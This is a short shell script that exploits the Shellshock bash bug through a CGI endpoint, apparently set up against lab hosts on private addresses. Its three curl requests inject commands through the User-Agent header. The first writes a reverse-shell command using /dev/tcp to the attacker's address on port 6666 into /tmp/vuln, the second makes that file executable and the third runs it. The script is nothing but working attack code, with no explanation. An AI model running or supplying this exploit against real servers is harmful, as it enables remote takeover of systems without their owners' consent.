#!/bin/sh

attacker="10.0.2.15"
victim="10.0.2.16"

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo exec bash -i \> /dev/tcp/${attacker}/6666 2\>\&1 0\>\&1 \&  > /tmp/vuln'" http://"${victim}":80/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'chmod +x /tmp/vuln'" http://"${victim}":80/cgi-bin/vulnerable

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'exec /tmp/vuln'" http://"${victim}":80/cgi-bin/vulnerable
